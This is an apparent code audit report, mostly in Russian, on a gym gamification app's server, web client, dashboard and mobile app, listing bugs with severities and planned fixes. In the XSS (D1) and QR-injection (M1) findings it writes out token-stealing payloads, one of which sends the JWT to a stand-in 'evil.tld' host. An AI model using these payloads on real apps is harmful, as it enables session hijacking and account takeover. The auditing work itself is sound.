# Gym Quest — Code Audit Report

> Systematic pass over `server/`, `client/`, `dashboard/`, `mobile/`, infra.
> Generated: 2026-04-22, as part of Phase 0 of cleanup project.
> Spec: https://github.com/zemdenalex — см. локальный `F127 - HeroQuest/docs/superpowers/specs/2026-04-22-gymquest-cleanup-design.md`.

## Phase 2 closure (2026-04-23 — branch `cleanup/phase-2-frontend`)

**Closed in Phase 2:**
- **C1, C2** — XSS в leaderboard + custom exercise: `elt()` DOM-builder в `client/js/screens/board.js`, `workout.js`, `library.js`. Все пользовательские строки идут через `text:` → `textContent`.
- **C3** — 401 handling: `client/js/api.js` чистит auth + reload на 401, но только если `state.tk` был установлен (иначе — ошибка показывается в `#a-err`).
- **C4** — `confirm()` заменён на `confirmModal()` в `client/js/ui/modal.js` (Promise-based).
- **C5** — короткие идентификаторы переименованы: `ap → apiCall`, `ts → showToast`, `fn → formatNumber`, `rH → renderHome`, `rP → renderProfile`, `sT → switchTab`, `doCI → quickCheckin`, `startW/canW/finW → startWorkout/cancelWorkout/finishWorkout`, `rW → renderWorkoutBuilder`, `aS/rmS/rmEx/uS/uWS → addSet/removeSet/removeExercise/updateSetField/updateWorkoutSummary`, `openLib/clLib/fLib/aEx/addC → openLibrary/closeLibrary/filterLibrary/addExercise/addCustomExercise`, `out → logout`, `lB → loadLeaderboard`, `lHi → loadHistory`, `tglAuth/pH/doAuth/go → toggleAuthMode/pickHero/submitAuth/enterApp`.
- **C6** — `min`/`max`/`step` на numeric inputs в `client/js/screens/workout.js` (повторы 0-999 step 1, вес 0-9999 step 0.5).
- **C8 (partial)** — все `onclick=`/`oninput=`/`onchange=` удалены из `client/index.html` и `dashboard/index.html`, заменены на `addEventListener` + event delegation в `main.js`. Inline `style="..."` остаются (вне бюджета — spec §4.4).
- **C9** — `<form id="auth-form">` обёртка в `client/index.html`, submit handler вызывает `submitAuth()`. Enter в password submit'ит форму.
- **D4** — QR-генерация локальная: `dashboard/vendor/qrcode.min.js` (qrcode-generator@1.4.4, 20KB, sha256:bb2365e4902f4f84852cf4025e6f6a60325a682aeafa43fb63b7fc8f098d1ef2). `dashboard/js/screens/qr.js` использует `createDataURL(5,0)` + real `<img>` element. **No more `api.qrserver.com` calls.**
- **D5** — 401 handling в `dashboard/js/api.js` (с тем же gating что C3).
- **D6** — все `alert()` заменены на `showToast()`; добавлен `<div id="d-toast" class="toast">` и `showToast()` в `dashboard/js/ui/toast.js`.
- **D7** — `dashboard/js/screens/overview.js` читает `stats.name` из API (сервер возвращает его с Plan 2a) и ставит в `#d-club-name`.
- **D8** — валидация `end_date >= start_date` в `dashboard/js/screens/seasons.js`: red toast если end < start. Дополнительно `s-end.min` синкается при change на `s-start`.
- **D9** — persistent Club ID banner в `dashboard/index.html` (`#d-club-id-banner`) показывается после auth; копирование через `copyToClipboard()` + success toast.

**Architecture changes:**
- Inline `<style>` и `<script>` полностью вынесены из `client/index.html` (194 → ~108 строк) и `dashboard/index.html` (272 → ~108 строк).
- `shared/css/tokens.css` — единый источник правды для CSS custom properties, подключается к обоим фронтам.
- `server/src/routes/static.js` монтирует `/shared` для tokens.css.
- ES-модули через нативный `<script type="module">`, без build-step. Android WebView совместимо.
- 14 модулей клиента + 13 модулей дашборда + 1 vendored библиотека.

**Non-regression invariants held:**
- localStorage ключи byte-for-byte: `hq_token`, `hq_club`, `hq_dtoken`, `hq_dclub`.
- API контракт не менялся (grep-verified).
- `grep -rn 'innerHTML' client/js/ dashboard/js/` → empty (security invariant).

**Remaining out-of-budget (unchanged since spec):**
- C7 (JWT в localStorage) — документирован как known risk; attack vector закрыт через C1/C2.
- S9 (timezone streak) — отдельный CR, требует DB-миграции.
- S12 (N+1 achievements) — мало данных, не стоит времени.
- I6/I7/I10/I2/I3/I4/I5/I9 — Phase 4 (CI + docs).

**Visual parity:** проверяется вручную в браузере на prod после merge (Docker недоступен локально). DevTools Network tab на `/dashboard` подтверждает отсутствие request'ов к `api.qrserver.com`.

## Legend

| Критичность | Что означает |
|---|---|
| 🔴 critical | Угроза безопасности или "ломает прод прямо сейчас". Hotfix-escape — фиксится до начала Phase 1. |
| 🟠 high | Ошибка корректности / отсутствие валидации / данные можно попортить. Фикс в Phase 1-3. |
| 🟡 medium | DX / code quality / minor bugs. Если есть время. |
| ⚪ nit | Косметика / стиль. |

## Summary

Всего найдено: **54** проблемы.

| Severity | Count | В бюджет Phase 1-4 | Out of budget |
|---|---|---|---|
| 🔴 critical | 4 | 3 (все через hotfix-escape) | 1 (timezone — отдельный CR) |
| 🟠 high | 19 | ~18 | ~1 |
| 🟡 medium | 22 | ~18 | ~4 |
| ⚪ nit | 9 | ~4 | ~5 |
| **Всего** | **54** | **~43** | **~11** |

### 🔴 Critical bugs (hotfix-escape)

Эти закрываются в **первую** очередь, перед началом Phase 1:

1. **S1** — `server/index.js:36` — JWT_SECRET fallback к dev-значению в проде. Статус: требует проверки env на prod VDS. Если задан — ждёт Phase 1. Если нет — immediate hotfix.
2. **D1** — `dashboard/index.html:156-159` — XSS через member name в alerts list → утечка club-owner JWT. **Immediate hotfix.**
3. **D2** — `dashboard/index.html:166-169` — XSS через member name в members list → утечка. **Immediate hotfix** (в том же PR с D1).
4. **M1** — `mobile/App.js:97-100` — JS-injection через QR-код. Низкая вероятность эксплоита (мало APK в поле), но фикс в 3 строки. Включить либо в hotfix D1+D2, либо в Phase 3.

**Hotfix-план:**
- Branch `hotfix/xss-dashboard` после merge Phase 0
- Fix D1 + D2 через `textContent`-based render в обеих функциях
- Optional: M1 в том же PR или отдельно в Phase 3
- Проверить S1 на VDS — если env задан, отложить до Phase 1; если нет — ещё один hotfix

### Out of budget (с обоснованием)

| Bug | Почему не входит |
|---|---|
| S9 (timezone) | Затрагивает DB schema + business logic, отдельный большой фичер |
| C7 (JWT localStorage) | Решается через XSS-фиксы C1/C2. Переезд на httpOnly cookie — отдельный CR |
| S12 (N+1 achievements) | Мало данных, не стоит времени |
| I8 (compose version) | На v2 работает как есть |

### Baseline метрики (до Phase 1)

Записаны в Task P0.17 после установки tooling на текущий (до-рефакторинг) код.

- **ESLint:** 3 errors + 9 warnings = 12 issues (1 parse error в `mobile/App.js` из-за JSX без babel-parser + 11 в `server/index.js`: 2 errors + 9 warnings)
- **Prettier:** 9 файлов с issues (`.github/workflows/deploy.yml`, `client/index.html`, `dashboard/index.html`, `docker-compose.yml`, `docs/audit-report.md`, `ecosystem.config.js`, `mobile/App.js`, `README.md`, `server/index.js`)
- **`tsc --noEmit`:** 25 errors (почти все — missing `@types/bcryptjs`, `@types/uuid`, `@types/pg`, `@types/express-rate-limit`, `@types/nodemailer`. В Phase 1 либо добавляем @types для использованных пакетов, либо пишем JSDoc-type в `src/` и отключаем внешнюю проверку)
- **Smoke test (prod) steps passing:** 7/8 (все шаги кроме cleanup — отсутствует `DELETE /api/clubs/:id`, см. баг S15)

**Цель для конца Phase 4:** 0 ESLint errors, 0 Prettier issues, 0 tsc errors, 8/8 smoke passing (после добавления DELETE endpoint в Phase 1).

---

## server/index.js

### Bug S1: JWT_SECRET fallback к dev-значению в проде

- **Файл:** `server/index.js:36`
- **Критичность:** 🔴 critical → понижено до 🟠 high после проверки prod env
- **Категория:** security
- **Что сломано:**

```js
const JWT_SECRET = process.env.JWT_SECRET || "hq_dev_secret_change_in_prod";
```

Если `JWT_SECRET` env-переменная не установлена в проде (например, опечатка в `.env`), сервер стартует с известным dev-секретом. Атакующий, знающий стек, может форжить JWT-токены любого клуба/атлета.

- **Как чиним:** fail-fast в проде — если `NODE_ENV=production` и `JWT_SECRET` не задан, `process.exit(1)` со внятной ошибкой. В dev можно оставить fallback. Это типичная часть `config.js` из Phase 1.
- **Входит в бюджет:** yes (Phase 1, `config.js`)
- **Status:** ✅ Не эксплуатируется на prod — проверено 2026-04-22 через `ssh root@194.67.102.76 'grep JWT_SECRET /opt/gymquest/.env'`, значение — proper 64-char hex random. Ротирован после этой проверки для гигиены. Остаётся в Phase 1 как улучшение (fail-fast), а не срочный hotfix.

---

### Bug S2: SSL к Postgres без проверки сертификата

- **Файл:** `server/index.js:43`
- **Критичность:** 🟠 high
- **Категория:** security
- **Что сломано:**

```js
ssl: isProd ? { rejectUnauthorized: false } : false
```

MITM к Postgres не будет обнаружен. На одном хосте (прямо сейчас на этом VDS) это не критично, но если база когда-либо переедет на managed Postgres — это дыра. Также `isProd` forces SSL, но наш self-signed cert в `db-ssl/` не валидируется.

- **Как чиним:** сделать опциональным через env. `DB_SSL_MODE=require|verify-ca|disable`. По умолчанию на проде `require` без `rejectUnauthorized: false`.
- **Входит в бюджет:** yes (Phase 1)

---

### Bug S3: Rate-limiter может тихо отключиться

- **Файл:** `server/index.js:22-33`
- **Критичность:** 🟠 high
- **Категория:** security
- **Что сломано:**

```js
let rateLimit;
try { rateLimit = require("express-rate-limit"); } catch {}
if (rateLimit) { app.use(...); }
```

Если `express-rate-limit` не установлен (забыли в package.json, корректно удалили, ошиблись), сервер стартует без rate-limit'ов и клиенты могут брутфорсить логины безнаказанно. Нет даже warning'а в логе.

- **Как чиним:** rate-limit должен быть обязательной зависимостью. Убрать try/catch. Если нет — падать при старте (это `config.js` fail-fast).
- **Входит в бюджет:** yes (Phase 1)

---

### Bug S4: Пароли не валидируются по длине/сложности

- **Файл:** `server/index.js:238-246` (clubs/register), `258-267` (members/register)
- **Критичность:** 🟠 high
- **Категория:** security / correctness
- **Что сломано:** регистрация принимает пароль любой длины, даже `""` или `" "`. bcrypt захэширует и запишет. Потом логин не пройдёт если пустой, но слабые пароли (`123`) пройдут.
- **Как чиним:** zod-схема в Phase 1 с `password: z.string().min(8).max(128)`.
- **Входит в бюджет:** yes (Phase 1, `models/schemas.js`)

---

### Bug S5: Email не валидируется по формату и не нормализуется

- **Файл:** `server/index.js:238-254` (clubs), `258-275` (members)
- **Критичность:** 🟠 high
- **Категория:** correctness
- **Что сломано:** регистрация не проверяет валидность email (`"not-an-email"` пройдёт). Логин делает exact match: если зарегистрировались как `Foo@Bar.com`, логин с `foo@bar.com` не работает.
- **Как чиним:** zod + `email()` валидация + `toLowerCase().trim()` и на записи, и на логине.
- **Входит в бюджет:** yes (Phase 1)

---

### Bug S6: Дубликат email/slug → 500 вместо 409

- **Файл:** `server/index.js:243-245` (clubs), `265` (members)
- **Критичность:** 🟠 high
- **Категория:** correctness
- **Что сломано:** если регистрируем клуб с уже существующим email или slug, pg вернёт `unique constraint violation`, наш wrap пропустит в default error handler и вернёт `500 Server error`. Клиенту непонятно, что случилось.
- **Как чиним:** в `services/clubs.js` проверять conflict явно (SELECT перед INSERT) или ловить pg error code `23505` и превращать в 409.
- **Входит в бюджет:** yes (Phase 1)

---

### Bug S7: Ошибочный статус 500 для "клуб не существует"

- **Файл:** `server/index.js:265` (members/register)
- **Критичность:** 🟠 high
- **Категория:** correctness
- **Что сломано:** после UUID-валидации (S13 fixed) мы знаем что формат UUID правильный. Но если такого клуба нет, INSERT упадёт по FK → 500. Нужно 404 с читаемым сообщением.
- **Как чиним:** SELECT clubs WHERE id=$1 перед INSERT members; если нет — `404 { error: "Club not found" }`.
- **Входит в бюджет:** yes (Phase 1)

---

### Bug S8: Global error handler зарегистрирован ПЕРЕД роутами

- **Файл:** `server/index.js:231-234`
- **Критичность:** 🟠 high
- **Категория:** correctness
- **Что сломано:** error-handling middleware Express вызывается в порядке регистрации. Регистрируется на L231, но все `app.post`/`app.get` идут после L236. Когда роут выкидывает ошибку через `wrap(...)`, Express ищет error-handler AFTER failing middleware в стеке. Наш error-handler зарегистрирован ДО роутов → Express его не находит → используется default handler Express, который шлёт HTML-страницу со стектрейсом в не-prod.

Реальное поведение: в prod (`isProd=true`) default handler Express сводится к 500 + HTML. Наш кастомный с `"Server error"` JSON никогда не срабатывает.

- **Как чиним:** в Phase 1 переместить error-handler в `app.js` как последнее `app.use()` после всех `routes.use()`.
- **Входит в бюджет:** yes (Phase 1)

---

### Bug S9: Timezone-bug в streak логике

- **Файл:** `server/index.js:184-192` (getStreakAction), `302, 423` (workout/qr-checkin)
- **Критичность:** 🟠 high
- **Категория:** correctness
- **Что сломано:**

```js
const today = new Date().toISOString().split("T")[0];
```

Всегда UTC-дата. Для пользователя в Москве (UTC+3), тренировка в 02:00 мск → UTC 23:00 предыдущего дня → `last_w = YYYY-MM-DD` прошлый день. Следующая тренировка в 12:00 мск получит `continue` как будто это соседний день, хотя прошло 1.5 суток по locale.

Более критичный случай: тренировка в 23:50 мск → UTC 20:50 того же дня → `last_w` ok. Но следующая в 01:00 через 1h10m → UTC 22:10 того же дня → same date → streak=same. А надо бы continue (локально новый день).

- **Как чиним:** использовать timezone клуба (сохранять в `clubs.timezone` или брать из JWT) + `DateTime` с `Intl.DateTimeFormat` или `luxon`. Это не входит в 10k бюджет — сложная правка затронет DB + логику. Записываем как 🟠 high но ВНЕ скоупа cleanup'а. CR для клиента отдельно.
- **Входит в бюджет:** **no** — timezone-correctness это отдельный фичер. В Phase 1 оставляем UTC + комментарий-ссылку на этот bug.

---

### Bug S10: parseInt без NaN check в query params

- **Файл:** `server/index.js:330` (workouts/history limit)
- **Критичность:** 🟡 medium
- **Категория:** correctness
- **Что сломано:** `parseInt(req.query.limit) || 20` — если `?limit=abc`, parseInt → NaN, NaN || 20 → 20 (ok!). На самом деле OK благодаря `|| 20`. Но `Math.min(NaN, 100)` → NaN, тогда без `|| 20` упало бы. Здесь защитились falsy. Всё-таки стоит заменить на zod-парсинг:

```js
const limit = z.coerce.number().int().min(1).max(100).default(20).parse(req.query.limit);
```

- **Как чиним:** в Phase 1 через `models/schemas.js`.
- **Входит в бюджет:** yes (Phase 1)

---

### Bug S11: N+1 queries в workouts создании

- **Файл:** `server/index.js:307-312`
- **Критичность:** 🟡 medium
- **Категория:** performance
- **Что сломано:** для каждого exercise в массиве делается отдельный INSERT. Если юзер присылает 10 упражнений — 10 round-trip-ов в БД.
- **Как чиним:** один multi-row INSERT через `pg-format` или ручной ... VALUES ($1,$2,...),($N+1,$N+2,...) билдер.
- **Входит в бюджет:** yes (Phase 1)

---

### Bug S12: N+1 queries в checkAchievements

- **Файл:** `server/index.js:194-208`
- **Критичность:** 🟡 medium
- **Категория:** performance
- **Что сломано:** N=11 INSERT-ов в лучшем случае, но обычно 0-3 новых. Accept.
- **Как чиним:** пока не трогаем — ONSERT-ов мало.
- **Входит в бюджет:** no (не стоит времени)

---

### Bug S13: `console.log` / `console.error` везде

- **Файл:** `server/index.js:141, 232, 448, 507-511, 515`
- **Критичность:** 🟡 medium
- **Категория:** dx
- **Что сломано:** нет structured logging, нельзя фильтровать по уровню, нельзя перенаправить.
- **Как чиним:** pino в Phase 1. Заменяем на `logger.info/error/warn`.
- **Входит в бюджет:** yes (Phase 1, `logger.js`)

---

### Bug S14: Магические числа и строки

- **Файл:** `server/index.js:27-32, 147-167, 180, 245, 253, 274, 331, 335, 391, 407, 439`
- **Критичность:** ⚪ nit
- **Категория:** dx
- **Что сломано:** rate-limit windows `15 * 60 * 1000`, XP_LEVELS, `30` в `Math.min(streak, 30)`, JWT expiry `"30d"`, `"24h"`, limits 50/20/10, SMTP default port `"587"`. Всё хардкодится inline.
- **Как чиним:** `constants.js` в Phase 1.
- **Входит в бюджет:** yes (Phase 1)

---

### Bug S15: Нет DELETE /api/clubs/:id (smoke не может убрать тестовые данные)

- **Файл:** `server/index.js` (absent)
- **Критичность:** 🟡 medium
- **Категория:** feature / dx
- **Что сломано:** smoke-test создаёт тестовый клуб, не может его удалить. Приходится чистить вручную через SSH+psql.
- **Как чиним:** добавить endpoint `DELETE /api/clubs/:id` с `auth("club")` + проверкой что `req.user.id === req.params.id`. FK cascade снесёт всё связанное.
- **Входит в бюджет:** yes (Phase 1, `routes/clubs.js`)

---

### Bug S16: Нет проверки что QR-токен соответствует сегодняшней дате

- **Файл:** `server/index.js:411-416`
- **Критичность:** 🟡 medium
- **Категория:** correctness
- **Что сломано:** `qr-token` JWT содержит `date: today` при выпуске. В `qr-checkin` мы проверяем подпись и `type/club_id`, но не проверяем что `decoded.date === сегодня`. QR выпущенный вчера и ещё не истёкший (24h expiry + границы) будет валиден "как чекин на сегодня".
- **Как чиним:** добавить проверку `decoded.date === new Date().toISOString().split("T")[0]` — иначе 400.
- **Входит в бюджет:** yes (Phase 1)

---

### Bug S17: initDB() не имеет миграций

- **Файл:** `server/index.js:58-142`
- **Критичность:** 🟠 high
- **Категория:** dx / dev-safety
- **Что сломано:** схема определена через `CREATE TABLE IF NOT EXISTS`. Любая будущая правка схемы (ALTER TABLE) требует написать `ALTER TABLE IF EXISTS ... IF NOT EXISTS COLUMN` — но это не работает для всех типов правок. Нет истории изменений.
- **Как чиним:** миграционный раннер в Phase 1 с bootstrap'ом для существующей prod БД (см. §4.3 спека).
- **Входит в бюджет:** yes (Phase 1, core deliverable)

---

### Bug S18: Нет /api/health detail info

- **Файл:** `server/index.js:497-500`
- **Критичность:** ⚪ nit
- **Категория:** dx
- **Что сломано:** `/api/health` есть, но возвращает только `{status, version, name, db}`. Нет `uptime`, `node_version`, `build_sha` — для мониторинга и отладки.
- **Как чиним:** добавить поля в Phase 1.
- **Входит в бюджет:** yes (Phase 1, `routes/health.js`)

---

## client/index.html

### Bug C1: XSS через имя члена в leaderboard

- **Файл:** `client/index.html:166` (функция `lB()`)
- **Критичность:** 🟠 high
- **Категория:** security
- **Что сломано:**

```js
'<div>'+m.name+(m.is_you?" (ты)":"")+'</div>'
```

`m.name` берётся напрямую из `/api/leaderboard/:club_id` и вставляется в HTML-строку. Любой член клуба может зарегистрироваться с именем содержащим скрипт-теги (сервер не санитизирует, см. S4 nameless/reject). Когда другие члены открывают рейтинг — чужой скрипт выполняется в их WebView.

- **Как чиним:** в Phase 2 при выделении `screens/board.js` рендерить через безопасные DOM-API (createElement + textContent), либо через `<template>` клонирование. Ни одного inline HTML с user-данными.
- **Входит в бюджет:** yes (Phase 2)

---

### Bug C2: XSS через имя custom-упражнения в workout builder

- **Файл:** `client/index.html:175, 187-188` (функции `rW()`, `fLib()`, `aEx()`)
- **Критичность:** 🟠 high
- **Категория:** security
- **Что сломано:** custom exercise (через поле `lib-c` → `addC()`) принимает любой текст и подставляется в inline HTML через template strings. Эскейп в `aEx('${n.replace(/'/g,"\\'")}')` защищает только от закрытия кавычки — через атрибуты или HTML-теги обходится.
- **Как чиним:** в Phase 2 рендер через DOM-API.
- **Входит в бюджет:** yes (Phase 2)

---

### Bug C3: Inconsistent error handling на ap() вызовах

- **Файл:** `client/index.html:160` (go), `166` (lB), `168` (lHi)
- **Критичность:** 🟡 medium
- **Категория:** correctness
- **Что сломано:** `ap()` кидает на non-ok response. `doAuth()` ловит и показывает. Но `lB()` и `lHi()` имеют `catch(e){}` — молча проглатывают. При сетевой ошибке UI показывает пустой лидерборд или историю, без подсказки что случилось.

Также если токен истёк → 401 → throw → проглочено → пустая страница. Пользователь не поймёт, что нужно перелогиниться.

- **Как чиним:** в Phase 2 в `js/api.js` единый wrapper, который на 401 редиректит на auth screen и clear token. На network errors показывает toast.
- **Входит в бюджет:** yes (Phase 2)

---

### Bug C4: `confirm()` для подтверждения отмены тренировки

- **Файл:** `client/index.html:173` (canW)
- **Критичность:** 🟡 medium
- **Категория:** dx / ux
- **Что сломано:** blocking нативный диалог. На WebView иногда ломается — приходится тапать дважды. Плохой UX.
- **Как чиним:** в Phase 2 заменить на custom modal из `components.css`.
- **Входит в бюджет:** yes (Phase 2)

---

### Bug C5: Минификация хэндлов имён функций

- **Файл:** весь `client/index.html` JS-блок (L135-194)
- **Критичность:** 🟡 medium
- **Категория:** dx
- **Что сломано:** `ap, ts, fn, go, rH, rP, lB, lHi, sT, doCI, startW, canW, rW, aS, rmS, rmEx, uS, uWS, finW, openLib, clLib, fLib, aEx, addC, out` — однобуквенные имена без комментариев. Невозможно осмысленно поддерживать.
- **Как чиним:** в Phase 2 при выделении в `js/*.js` переименовать всё в полные имена (renderHome, renderProfile, loadLeaderboard, и т.д.).
- **Входит в бюджет:** yes (Phase 2)

---

### Bug C6: Нет валидации веса/повторов в UI

- **Файл:** `client/index.html:180` (uS)
- **Критичность:** 🟠 high
- **Категория:** correctness
- **Что сломано:** `W[i].s[j][f]=parseFloat(v)||0` — принимает negative, NaN-coerced, огромные значения (999999кг вес). Сервер (после Phase 1 zod) отклонит, но пока — принимает.
- **Как чиним:** server-side zod в Phase 1 закроет дырку. UI-side валидация в Phase 2 с min/max/step на inputs.
- **Входит в бюджет:** yes (Phase 1 server + Phase 2 client)

---

### Bug C7: JWT в localStorage (XSS-susceptibility)

- **Файл:** `client/index.html:148`
- **Критичность:** 🟡 medium
- **Категория:** security
- **Что сломано:** токен доступен любому скрипту на странице. В связке с XSS (C1, C2) — атакующий сливает токен. Самая правильная защита — httpOnly cookie, но это переделка auth flow.
- **Как чиним:** документировать как known risk, исправить XSS (C1, C2). Переезд на httpOnly cookie — отдельный CR, не в рамках 10k.
- **Входит в бюджет:** no — исправляем _источники_ XSS через C1, C2. Хранение токена оставляем как есть.

---

### Bug C8: Inline event handlers + inline styles

- **Файл:** `client/index.html:39-122`
- **Критичность:** ⚪ nit
- **Категория:** dx / future CSP
- **Что сломано:** `onclick="..."` и `style="..."` везде. Если добавим CSP-заголовок `script-src 'self'` (что стоило бы в Phase 4), всё сломается — потребуется `unsafe-inline`.
- **Как чиним:** в Phase 2 при выделении JS в модули — вешать обработчики через `addEventListener`. Inline `style=` оставляем по мере необходимости (их сотни, перевод в классы — отдельная большая работа вне скоупа).
- **Входит в бюджет:** частично (event handlers в бюджете, inline styles — нет)

---

### Bug C9: Enter в форме логина не submit

- **Файл:** `client/index.html:42-58`
- **Критичность:** ⚪ nit
- **Категория:** ux
- **Что сломано:** нет `<form>` или `keydown` handler, Enter не вызывает `doAuth()`.
- **Как чиним:** в Phase 2 обернуть auth-экран в `<form onsubmit="...">`.
- **Входит в бюджет:** yes (Phase 2)

---

## dashboard/index.html

### Bug D1: XSS через member name в alerts list — КРИТИЧНО (эскалация привилегий)

- **Файл:** `dashboard/index.html:156-159` (dLoadAlerts)
- **Критичность:** 🔴 critical
- **Категория:** security
- **Что сломано:** member `a.name` из `/api/club/alerts` вставляется в HTML без экранирования. Любой член клуба может зарегистрироваться с именем `<img src=x onerror=fetch('/evil?t='+localStorage.hq_dtoken)>`. Через 5 дней неактивности он попадёт в alerts-лист у владельца клуба. Владелец заходит в дашборд → его JWT утекает к атакующему → атакующий получает полный доступ к клубу (удаление членов, смена настроек, просмотр всех данных).

Это не просто self-XSS — это cross-privilege escalation member→club-owner.

- **Как чиним:** **hotfix-escape** — фиксить до начала Phase 1. Самый минимальный фикс: ТЕКСТОВАЯ замена шаблонной строки на `textContent`-основанный рендер в `dLoadAlerts`. Либо временно серверная санитизация `name` в `/api/club/alerts` ответе (strip HTML chars).
- **Входит в бюджет:** yes (hotfix перед Phase 1)
- **Hotfix-escape:** YES, немедленно после merge Phase 0.

---

### Bug D2: XSS через member name в members list

- **Файл:** `dashboard/index.html:166-169` (dLoadMembers)
- **Критичность:** 🔴 critical
- **Категория:** security
- **Что сломано:** аналогично D1, через `/api/club/members`.
- **Как чиним:** тот же hotfix, что D1 (один PR покрывает оба).
- **Входит в бюджет:** yes (hotfix)
- **Hotfix-escape:** YES.

---

### Bug D3: XSS через season name/description

- **Файл:** `dashboard/index.html:205-209` (loadSeasons)
- **Критичность:** 🟠 high
- **Категория:** security
- **Что сломано:** `s.name` и `s.description` созданные клубом же через форму → showed back. Self-XSS — владелец заражает сам себя. Но если в будущем добавится super-admin панель, все клубы → супер-админ.
- **Как чиним:** единый фикс в Phase 2 при выделении `dashboard/js/screens/seasons.js`.
- **Входит в бюджет:** yes (Phase 2)

---

### Bug D4: QR-токен отправляется на стороннее API (api.qrserver.com)

- **Файл:** `dashboard/index.html:183` (genQR)
- **Критичность:** 🟠 high
- **Категория:** security / dependency
- **Что сломано:**

```js
const url="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data="+encodeURIComponent(r.qr_token);
```

QR-токен (JWT с подписью) уходит на сторонний сервис как часть URL → пишется в их логи. Токен действует 24h, даёт право на workout checkin от имени _любого_ атлета в клубе.

Риски: (а) api.qrserver.com compromised → утечка всех токенов всех клубов; (б) атакующий внутри api.qrserver.com может сделать чекины от лица произвольных членов; (в) token в URL может попасть в HTTP Referer headers на других страницах.

- **Как чиним:** сгенерировать QR локально через `qrcode-generator` или `qrcodejs` (есть npm-пакеты весом ~15KB без внешней зависимости). Либо через `<canvas>` + чистый JS. В Phase 2 при `dashboard/js/screens/qr.js`.
- **Входит в бюджет:** yes (Phase 2)

---

### Bug D5: dEnter на 401 не выкидывает на логин

- **Файл:** `dashboard/index.html:137-145` (dEnter)
- **Критичность:** 🟠 high
- **Категория:** correctness / ux
- **Что сломано:** `catch(e){console.error(e);}` — если fetch к `/club/stats` вернул 401 (expired token), пользователь видит пустой дашборд и не понимает, что надо перелогиниться.
- **Как чиним:** в Phase 2 единый `api.js` wrapper с 401 → `dLogout()` и возврат на login screen.
- **Входит в бюджет:** yes (Phase 2)

---

### Bug D6: alert() вместо нормального UI

- **Файл:** `dashboard/index.html:128, 186, 194, 199`
- **Критичность:** 🟡 medium
- **Категория:** ux
- **Что сломано:** blocking native alert, плохой UX. Особенно `alert("Клуб создан! ID для клиентов: "+dClubId)` — UUID нужно копировать, а из alert неудобно.
- **Как чиним:** в Phase 2 toast + copy-to-clipboard button для club_id на dashboard home.
- **Входит в бюджет:** yes (Phase 2)

---

### Bug D7: Название клуба hard-coded "Клуб"

- **Файл:** `dashboard/index.html:138`
- **Критичность:** 🟡 medium
- **Категория:** correctness
- **Что сломано:** `document.getElementById("d-club-name").textContent="Клуб"` — hardcoded. API `/club/stats` не возвращает имя клуба.
- **Как чиним:** в Phase 1 добавить `name` в ответ `/club/stats`, в Phase 2 — отображать реальное имя в dashboard header.
- **Входит в бюджет:** yes (Phase 1+2)

---

### Bug D8: Нет валидации что end_date >= start_date при создании сезона

- **Файл:** `dashboard/index.html:189-200` (createSeason)
- **Критичность:** 🟠 high
- **Категория:** correctness
- **Что сломано:** можно создать сезон 2026-04-22 → 2020-01-01. Сервер принимает, сохраняет, потом `dLoadSeasons` не покажет его как active.
- **Как чиним:** zod на сервере в Phase 1 (`.refine(s => s.end_date >= s.start_date)`), UI-валидация в Phase 2.
- **Входит в бюджет:** yes (Phase 1 + 2)

---

### Bug D9: Registration success показывает Club ID через alert, без возможности скопировать

- **Файл:** `dashboard/index.html:128`
- **Критичность:** 🟡 medium
- **Категория:** ux
- **Что сломано:** после регистрации клиенту показан UUID в `alert()`. В WebView/mobile очень сложно выделить и скопировать текст из alert. UUID критичен — без него атлеты не смогут зарегистрироваться в клубе.
- **Как чиним:** в Phase 2 dashboard home show a persistent "Club ID: xxx [📋 Copy]" prominently.
- **Входит в бюджет:** yes (Phase 2)

---

## mobile/App.js

### Bug M1: JS-injection через QR-код в injectJavaScript

- **Файл:** `mobile/App.js:97-100` (handleBarCodeScanned)
- **Критичность:** 🔴 critical
- **Категория:** security
- **Что сломано:**

```js
webviewRef.current?.injectJavaScript(`
  window.handleQRCheckin && window.handleQRCheckin("${data}");
  true;
`);
```

`data` — произвольный текст отсканированного QR — вставляется в JS-код как часть строкового литерала без экранирования. Злоумышленник печатает QR с содержимым `");fetch('https://evil.tld?t='+localStorage.hq_token);//` и подкидывает на ресепшн/в раздевалку клуба. Пользователь сканирует → атакующий получает его JWT → может делать чекины/изменения от его лица в течение 30 дней (срок токена).

- **Как чиним:** в Phase 3 — либо передавать через `JSON.stringify(data)` (безопасно эскейпит):

```js
webviewRef.current?.injectJavaScript(`
  window.handleQRCheckin && window.handleQRCheckin(${JSON.stringify(data)});
  true;
`);
```

либо валидировать что `data` соответствует JWT-формату (3 base64-секции через `.`) до инъекции.

- **Входит в бюджет:** yes (Phase 3)
- **Hotfix-escape:** RECOMMENDED — мобильный QR используется редко (APK только что доставлен), но фикс настолько маленький что можно сделать прямо в hotfix перед Phase 3. Или оставить для Phase 3 — APK в поле пока почти не у кого.

---

### Bug M2: CLUB_LOCATION = null ⇒ весь геофенс-код мёртв

- **Файл:** `mobile/App.js:15, 63-82`
- **Критичность:** 🟡 medium
- **Категория:** dead-code
- **Что сломано:** `const CLUB_LOCATION = null` — `setupGeofence()` на этой строке немедленно выходит (L64). Остальные 19 строк функции плюс `getDistance` (L84-90) висят без использования.
- **Как чиним:** в Phase 3 либо **удалить** геофенс полностью (вместе с `expo-location` из package.json и `Location` импортом), либо **активировать** — но для этого нужно знать координаты клуба, а их нет в API и нет в UI dashboard для задания. Практично — удалить.
- **Входит в бюджет:** yes (Phase 3, удаление)

---

### Bug M3: QR close-button невидим

- **Файл:** `mobile/App.js:176-183`
- **Критичность:** 🟡 medium
- **Категория:** ux
- **Что сломано:** кнопка закрытия — пустой `View` без иконки/текста `{/* Close button rendered via WebView text */}`. Пользователь не видит как закрыть камеру, жмёт физический back.
- **Как чиним:** в Phase 3 добавить `<Text>✕</Text>` в closeBtn. Минимальная правка.
- **Входит в бюджет:** yes (Phase 3)

---

### Bug M4: Dead nested StatusBar

- **Файл:** `mobile/App.js:170-173`
- **Критичность:** ⚪ nit
- **Категория:** dead-code
- **Что сломано:** в QR-режиме рендерится пустой `View` внутри overlay, внутри которого второй `StatusBar barStyle="light-content"`. Снаружи (L162) уже есть StatusBar — дубликат без эффекта.
- **Как чиним:** в Phase 3 удалить.
- **Входит в бюджет:** yes (Phase 3)

---

### Bug M5: goBack без проверки canGoBack

- **Файл:** `mobile/App.js:47-53`
- **Критичность:** 🟠 high
- **Категория:** correctness / ux
- **Что сломано:**

```js
BackHandler.addEventListener("hardwareBackPress", () => {
  if (webviewRef.current) {
    webviewRef.current.goBack();
